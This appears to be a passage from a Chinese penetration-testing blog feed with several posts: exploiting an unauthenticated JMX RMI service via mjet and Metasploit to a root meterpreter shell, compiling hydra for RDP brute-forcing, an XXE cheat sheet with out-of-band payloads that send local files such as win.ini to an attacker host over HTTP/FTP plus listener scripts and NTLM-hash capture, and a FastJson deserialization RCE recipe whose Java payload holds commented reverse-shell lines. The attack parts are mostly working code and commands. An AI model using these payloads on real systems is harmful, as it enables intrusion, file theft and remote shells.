<p>比较奇怪的是，用 msf 检测漏洞是否存在的时候，没有检测出来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/misc/java_rmi_server</span><br></pre></td></tr></table></figure></p>
<p><img src="http://x-f1v3.github.io/images/1575619247197.png" alt="image"></p>
<p>用 nmap 脚本也没有检测出来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=rmi-vuln-classloader -p 18983 127.0.0.1</span><br></pre></td></tr></table></figure></p>
<p><img src="http://x-f1v3.github.io/images/1575619340303.png" alt="image"></p>
<p>尴尬….</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="mjet"><a href="#mjet" class="headerlink" title="mjet"></a>mjet</h3><p>下载 <a href="https://github.com/x-f1v3/mjet" target="_blank" rel="noopener">mjet.py</a> 脚本。<br>因为开启的 jmx 服务默认是不需要验证的，所以直接利用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">../jdk1.8/bin/java -jar jython-standalone-2.7.0.jar mjet.py 127.0.0.1 18983 install passwd http://127.0.0.1:8000  8000</span><br><span class="line"></span><br><span class="line">../jdk1.8/bin/java -jar jython-standalone-2.7.0.jar mjet.py 127.0.0.1 18983 command passwd &quot;whoami&quot;</span><br></pre></td></tr></table></figure></p>
<p><img src="http://x-f1v3.github.io/images/1575619589642.png" alt="image"></p>
<h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><p>利用 <code>exploit/multi/misc/java_jmx_server</code> 模块</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use java/meterpreter/reverse_tcp</span><br><span class="line">msf payload(java/meterpreter/reverse_tcp) &gt; set LHOST 127.0.0.1</span><br><span class="line">LHOST =&gt; 127.0.0.1</span><br><span class="line">msf payload(java/meterpreter/reverse_tcp) &gt; set LPORT 4444</span><br><span class="line">LPORT =&gt; 4444</span><br><span class="line">msf payload(java/meterpreter/reverse_tcp) &gt; use exploit/multi/misc/java_jmx_server</span><br><span class="line">msf exploit(multi/misc/java_jmx_server) &gt; set RHOST 127.0.0.1</span><br><span class="line">RHOST =&gt; 127.0.0.1</span><br><span class="line">msf exploit(multi/misc/java_jmx_server) &gt; set RPORT 18983</span><br><span class="line">RPORT =&gt; 18983</span><br><span class="line">msf exploit(multi/misc/java_jmx_server) &gt; run</span><br><span class="line"></span><br><span class="line">[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?</span><br><span class="line">[*] Started reverse TCP handler on 127.0.0.1:4444 </span><br><span class="line">[*] 127.0.0.1:18983 - Using URL: http://0.0.0.0:8080/ka4B2HQsM</span><br><span class="line">[*] 127.0.0.1:18983 - Local IP: http://172.16.65.171:8080/ka4B2HQsM</span><br><span class="line">[*] 127.0.0.1:18983 - Sending RMI Header...</span><br><span class="line">[*] 127.0.0.1:18983 - Discovering the JMXRMI endpoint...</span><br><span class="line">[+] 127.0.0.1:18983 - JMXRMI endpoint on 127.0.1.1:18983</span><br><span class="line">[*] 127.0.0.1:18983 - Proceeding with handshake...</span><br><span class="line">[+] 127.0.0.1:18983 - Handshake with JMX MBean server on 127.0.1.1:18983</span><br><span class="line">[*] 127.0.0.1:18983 - Loading payload...</span><br><span class="line">[*] 127.0.0.1:18983 - Replied to request for mlet</span><br><span class="line">[*] 127.0.0.1:18983 - Replied to request for payload JAR</span><br><span class="line">[*] 127.0.0.1:18983 - Executing payload...</span><br><span class="line">[*] 127.0.0.1:18983 - Replied to request for payload JAR</span><br><span class="line">[*] Sending stage (53837 bytes) to 127.0.0.1</span><br><span class="line">[*] Meterpreter session 1 opened (127.0.0.1:4444 -&gt; 127.0.0.1:40740) at 2019-12-06 14:20:04 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 1 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>
<p><img src="http://x-f1v3.github.io/images/1575619715922.png" alt="image"></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://www.optiv.com/blog/exploiting-jmx-rmi" target="_blank" rel="noopener">Exploiting JMX RMI</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> 漏洞利用 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 反序列化 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[hydra问题]]></title>
      <url>//blog/1573541964775.html</url>
      <content type="html"><![CDATA[<p>Kali2.0里面的hydra是8.6版本的，在测试爆破3389时，能够正常运行，但是爆不出测试机的正确密码。<br><a id="more"></a></p>
<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>在Kali2.0上用hydra测试爆破3389时，爆破不出测试机的正确密码。一直在跳：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[STATUS] 1.00 tries/min, 5 tries in 00:00h, 0 to do in 03:00h, 1 active</span><br><span class="line">[STATUS] 0.83 tries/min, 5 tries in 00:00h, 0 to do in 03:00h, 1 active</span><br><span class="line">[STATUS] 0.56 tries/min, 5 tries in 00:00h, 0 to do in 03:00h, 1 active</span><br><span class="line">[STATUS] 0.36 tries/min, 5 tries in 00:00h, 0 to do in 03:00h, 1 active</span><br><span class="line">[STATUS] 0.33 tries/min, 5 tries in 00:00h, 0 to do in 03:00h, 1 active</span><br></pre></td></tr></table></figure></p>
<p>不知道啥意思，反正是爆破不出来，肯定有问题。</p>
<h2 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h2><p>想着是不是版本太低了，升级了一下，把hydra升级到当时的最新版本：<code>apt install hydra</code><br>跑了之后结果是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ERROR] Compiled without FREERDP2 support, module not available!</span><br></pre></td></tr></table></figure></p>
<p>emmm,貌似少了一个模块，本来想安装这个模块的，但是看了下，安装太慢，而且太麻烦了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/FreeRDP/FreeRDP</span><br></pre></td></tr></table></figure></p>
<p>别人的安装记录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.jianshu.com/p/86638f0e89d7</span><br></pre></td></tr></table></figure></p>
<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>还是到处搜啊，在Google上搜索到了其他人提交的<code>issue</code>：<a href="https://github.com/vanhauser-thc/thc-hydra/issues/420" target="_blank" rel="noopener">I have error with [ERROR] Compiled without FREERDP2 support, module not available! </a></p>
<p>编译安装最新版hydra，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/vanhauser-thc/thc-hydra.git</span><br><span class="line">cd thc-hydra</span><br><span class="line">sudo apt install freerdp2-dev</span><br><span class="line">make clean</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure></p>
<p>在kali2.0上测试成功。<br><img src="http://x-f1v3.github.io/images/1573543195446.png" alt="image"></p>
]]></content>
      
        <categories>
            
            <category> 工具 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> hydra </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[XXE漏洞]]></title>
      <url>//blog/1561960885122.html</url>
      <content type="html"><![CDATA[<p>最近经常碰到XXE漏洞，记录一下XXE的相关姿势和碰到的问题<br><a id="more"></a></p>
<h2 id="Blind-XXE-payload"><a href="#Blind-XXE-payload" class="headerlink" title="Blind XXE payload"></a>Blind XXE payload</h2><h3 id="通过ftp传输数据"><a href="#通过ftp传输数据" class="headerlink" title="通过ftp传输数据"></a>通过ftp传输数据</h3><h4 id="相关paylaod"><a href="#相关paylaod" class="headerlink" title="相关paylaod"></a>相关paylaod</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">request:</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo SYSTEM &quot;http://ip/111.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">111.dtd:</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % payload SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; trick SYSTEM &apos;ftp://fakeuser:fakepass@ip/%payload;&apos;&gt;&quot;&gt;</span><br><span class="line">%int;</span><br><span class="line">%trick;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------</span><br><span class="line"></span><br><span class="line">request:</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///C:/1.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://192.168.150.1/evil.xml&quot;&gt;</span><br><span class="line">%remote;</span><br><span class="line"> %all;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">evil.xml:</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY % send SYSTEM &apos;http://192.168.150.1/1.php?file=%file;&apos;&gt;&quot;&gt;</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY % send SYSTEM &apos;ftp://ip:8089/%file;&apos;&gt;&quot;&gt;</span><br><span class="line"></span><br><span class="line">-----------------------</span><br><span class="line">request:</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo SYSTEM &quot;http://ip/111.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">111.dtd</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % payload SYSTEM &quot;file:///c:/Windows/win.ini&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; trick SYSTEM &apos;ftp://ip:8089/%payload;&apos;&gt;&quot;&gt;</span><br><span class="line">%int;</span><br><span class="line">%trick;</span><br></pre></td></tr></table></figure>
<h4 id="伪装ftp服务"><a href="#伪装ftp服务" class="headerlink" title="伪装ftp服务"></a>伪装ftp服务</h4><p>方法一：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">1.py</span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">host = &quot;0.0.0.0&quot;</span><br><span class="line">port = 2121</span><br><span class="line"></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">sock.bind((host, port))</span><br><span class="line">sock.listen(1)</span><br><span class="line"></span><br><span class="line">print &apos;waiting for connection...&apos;</span><br><span class="line"></span><br><span class="line">(client_sock, client_addr) = sock.accept()</span><br><span class="line"></span><br><span class="line">client_sock.send(&quot;220 test\r\n&quot;)</span><br><span class="line">print &apos;start&apos;</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">  msg = client_sock.recv(1024)</span><br><span class="line">  msg = msg.rstrip()</span><br><span class="line"></span><br><span class="line">  if msg == &quot;&quot;:</span><br><span class="line">    print &apos;connection end&apos;</span><br><span class="line">    break</span><br><span class="line">  else:</span><br><span class="line">    if msg.startswith(&quot;USER &quot;):</span><br><span class="line">       client_sock.send(&quot;331 user \r\n&quot;)</span><br><span class="line">       print &quot;echo : %s&quot; % msg</span><br><span class="line">    elif msg.startswith(&quot;PASS &quot;):</span><br><span class="line">       client_sock.send(&quot;230 pass\r\n&quot;)</span><br><span class="line">       print &quot;echo : %s&quot; % msg</span><br><span class="line">    elif msg.startswith(&quot;TYPE &quot;):</span><br><span class="line">       client_sock.send(&quot;200 mode\r\n&quot;)</span><br><span class="line">       print &quot;echo : %s&quot; % msg</span><br><span class="line">    else:</span><br><span class="line">       client_sock.send(&quot;200 OK\r\n&quot;)</span><br><span class="line">       print &quot;echo : %s&quot; % msg</span><br><span class="line"></span><br><span class="line">client_sock.close()</span><br><span class="line"></span><br><span class="line">sock.close()</span><br></pre></td></tr></table></figure></p>
<p>方法二：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m pyftpdlib -p 21</span><br></pre></td></tr></table></figure></p>
<p>方法三：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.rb</span><br><span class="line"></span><br><span class="line">https://raw.githubusercontent.com/ONsec-Lab/scripts/master/xxe-ftp-server.rb</span><br></pre></td></tr></table></figure></p>
<p>方法四<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1.rb</span><br><span class="line"></span><br><span class="line">require &apos;socket&apos;</span><br><span class="line">server = TCPServer.new 2121</span><br><span class="line">loop do</span><br><span class="line">  Thread.start(server.accept) do |client|</span><br><span class="line">    puts &quot;New client connected&quot;</span><br><span class="line">    data = &quot;&quot;</span><br><span class="line">    client.puts(&quot;220 xxe-ftp-server&quot;)</span><br><span class="line">    loop &#123;</span><br><span class="line">        req = client.gets()</span><br><span class="line">        puts &quot;&lt; &quot;+req</span><br><span class="line">        if req.include? &quot;USER&quot;</span><br><span class="line">            client.puts(&quot;331 password please - version check&quot;)</span><br><span class="line">        else</span><br><span class="line">           #puts &quot;&gt; 230 more data please!&quot;</span><br><span class="line">            client.puts(&quot;230 more data please!&quot;)</span><br><span class="line">        end</span><br><span class="line">    &#125;</span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure></p>
<h2 id="读取的文件"><a href="#读取的文件" class="headerlink" title="读取的文件"></a>读取的文件</h2><p>Linux<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd</span><br><span class="line">/etc/hosts</span><br><span class="line">/etc/environment</span><br><span class="line">/etc/host.conf</span><br><span class="line">/sys/power/image_size</span><br></pre></td></tr></table></figure></p>
<p>Windows<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c:/Windows/debug/mrt.log</span><br><span class="line">c:/boot.ini</span><br></pre></td></tr></table></figure></p>
<h2 id="XXE-TO-RCE"><a href="#XXE-TO-RCE" class="headerlink" title="XXE TO RCE"></a>XXE TO RCE</h2><p>实战中未成功，成功了在详细记录。</p>
<h3 id="paylaod"><a href="#paylaod" class="headerlink" title="paylaod"></a>paylaod</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">request:</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo SYSTEM &quot;http://ip/1111.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">1111.dtd:</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; trick SYSTEM &apos;\\ip/1.txt&apos;&gt;&quot;&gt;</span><br><span class="line">%int;</span><br><span class="line">%trick;</span><br></pre></td></tr></table></figure>
<h3 id="伪装smb服务"><a href="#伪装smb服务" class="headerlink" title="伪装smb服务"></a>伪装smb服务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/SpiderLabs/Responder</span><br><span class="line">./Responder.py  -I ens3  -v</span><br></pre></td></tr></table></figure>
<p><img src="http://x-f1v3.github.io/images/1562058286529.png" alt="image"></p>
<p>案例及姿势<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">https://medium.com/@canavaroxum/xxe-on-windows-system-then-what-76d571d66745</span><br><span class="line">https://blog.csdn.net/weixin_34368949/article/details/88116535</span><br><span class="line">https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html</span><br><span class="line">https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-Net-NTLMv1%E4%BB%8B%E7%BB%8D/</span><br><span class="line">https://pentestlab.blog/tag/smb-relay/</span><br><span class="line">https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4</span><br><span class="line">http://www.it610.com/article/2378687.htm</span><br><span class="line">https://www.4hou.com/web/12964.html</span><br></pre></td></tr></table></figure></p>
<p>工具<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/SpiderLabs/Responder</span><br><span class="line">https://github.com/SecureAuthCorp/impacket</span><br></pre></td></tr></table></figure></p>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ul>
<li>一、java中部分jdk能通过http获取多行数据</li>
</ul>
<p><img src="http://x-f1v3.github.io/images/1561969654924.png" alt="image"></p>
<ul>
<li>二、jdk1.7以上不能使用<code>gopher://</code>协议并且修复了<code>HttpClient class</code>，只能使用ftp传数据。</li>
<li>三、jdk1.8.0_141以上无法用ftp读取文件，之前版本未测试，遇到再更新</li>
<li>四、jdk Version &gt;7u141 and &gt;8u162 无法用ftp读取文件<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2></li>
<li><a href="https://www.freebuf.com/articles/web/195899.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/195899.html</a></li>
<li><a href="https://www.mbsd.jp/blog/20171213.html" target="_blank" rel="noopener">https://www.mbsd.jp/blog/20171213.html</a></li>
<li><a href="https://github.com/JoyChou93/java-sec-code/wiki/XXE" target="_blank" rel="noopener">https://github.com/JoyChou93/java-sec-code/wiki/XXE</a></li>
<li><a href="https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html" target="_blank" rel="noopener">https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html</a></li>
<li><a href="https://skavans.ru/en/2017/12/02/xxe-oob-extracting-via-httpftp-using-single-opened-port/" target="_blank" rel="noopener">https://skavans.ru/en/2017/12/02/xxe-oob-extracting-via-httpftp-using-single-opened-port/</a></li>
<li><a href="http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html" target="_blank" rel="noopener">http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html</a></li>
<li><a href="https://gist.github.com/staaldraad/01415b990939494879b4" target="_blank" rel="noopener">https://gist.github.com/staaldraad/01415b990939494879b4</a></li>
<li><a href="https://blog.netspi.com/forcing-xxe-reflection-server-error-messages/" target="_blank" rel="noopener">https://blog.netspi.com/forcing-xxe-reflection-server-error-messages/</a></li>
<li><a href="https://www.radebit.com/web/article/2702.html" target="_blank" rel="noopener">https://www.radebit.com/web/article/2702.html</a></li>
<li><a href="https://medium.com/@alt3kx/out-of-band-xml-external-entity-oob-xxe-exploitation-over-fortify-software-security-center-ssc-1d5c7169b561" target="_blank" rel="noopener">https://medium.com/@alt3kx/out-of-band-xml-external-entity-oob-xxe-exploitation-over-fortify-software-security-center-ssc-1d5c7169b561</a></li>
<li><a href="https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-wp.pdf" target="_blank" rel="noopener">https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-wp.pdf</a></li>
<li><a href="https://www.slideshare.net/ssuserf09cba/xxe-how-to-become-a-jedi" target="_blank" rel="noopener">https://www.slideshare.net/ssuserf09cba/xxe-how-to-become-a-jedi</a></li>
<li><a href="https://www.kieranclaessens.be/cscbe-web-2018.html" target="_blank" rel="noopener">https://www.kieranclaessens.be/cscbe-web-2018.html</a></li>
<li><a href="https://medium.com/@canavaroxum/xxe-on-windows-system-then-what-76d571d66745" target="_blank" rel="noopener">https://medium.com/@canavaroxum/xxe-on-windows-system-then-what-76d571d66745</a></li>
<li><a href="https://xz.aliyun.com/t/3357" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357</a></li>
<li><a href="https://xz.aliyun.com/t/3601" target="_blank" rel="noopener">https://xz.aliyun.com/t/3601</a></li>
<li><a href="https://blog.h3xstream.com/2014/06/identifying-xml-external-entity.html" target="_blank" rel="noopener">https://blog.h3xstream.com/2014/06/identifying-xml-external-entity.html</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> 漏洞利用 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> XXE </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[FastJson反序列化RCE]]></title>
      <url>//blog/1561704300515.html</url>
      <content type="html"><![CDATA[<p>在一次代码审计中，发现了FastJson反序列化RCE漏洞，利用了一波。<br><a id="more"></a></p>
<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>1.2.24以及之前版本（2017.1）</p>
<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>方法很多，这里直接用<code>https://github.com/iBearcat/FastJson-JdbcRowSetImpl-RCE</code>的方法。</p>
<h4 id="修改-CommandObject-java"><a href="#修改-CommandObject-java" class="headerlink" title="修改 CommandObject.java"></a>修改 CommandObject.java</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>	java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span>	java.lang.Process;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommandObject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">CommandObject</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">			Runtime	rt	=	Runtime.getRuntime();</span><br><span class="line">			<span class="comment">//Runtime.getRuntime().exec("/bin/bash -i &gt;&amp;/dev/tcp/192.168.43.14/2018&lt;&amp;1");</span></span><br><span class="line">			<span class="comment">//String[] commands = &#123;"bash -c &#123;echo,L2Jpbi9iYXNoIC1pID4mL2Rldi90Y3AvMTkyLjE2OC40My4xNC8yMDE4PCYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"&#125;;</span></span><br><span class="line">			</span><br><span class="line">			String[] commands = &#123;<span class="string">"touch"</span>,<span class="string">"/opt/test"</span>&#125;; <span class="comment">//Command</span></span><br><span class="line">			Process	pc = rt.exec(commands);</span><br><span class="line">			pc.waitFor();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</span><br><span class="line">        CommandObject e = <span class="keyword">new</span> CommandObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="编译-CommandObject-java"><a href="#编译-CommandObject-java" class="headerlink" title="编译 CommandObject.java"></a>编译 CommandObject.java</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac CommandObject.java</span><br></pre></td></tr></table></figure>
<h4 id="开启HTTP服务"><a href="#开启HTTP服务" class="headerlink" title="开启HTTP服务"></a>开启HTTP服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure>
<h4 id="开启RMIServer"><a href="#开启RMIServer" class="headerlink" title="开启RMIServer"></a>开启RMIServer</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar FastJson_JdbcRowSetImpl_JNDI_RMIServer.jar  ip port</span><br></pre></td></tr></table></figure>
<h4 id="发送payload"><a href="#发送payload" class="headerlink" title="发送payload"></a>发送payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://ip:port/Object&quot;,&quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>
<h3 id="其他参考链接"><a href="#其他参考链接" class="headerlink" title="其他参考链接"></a>其他参考链接</h3><ul>
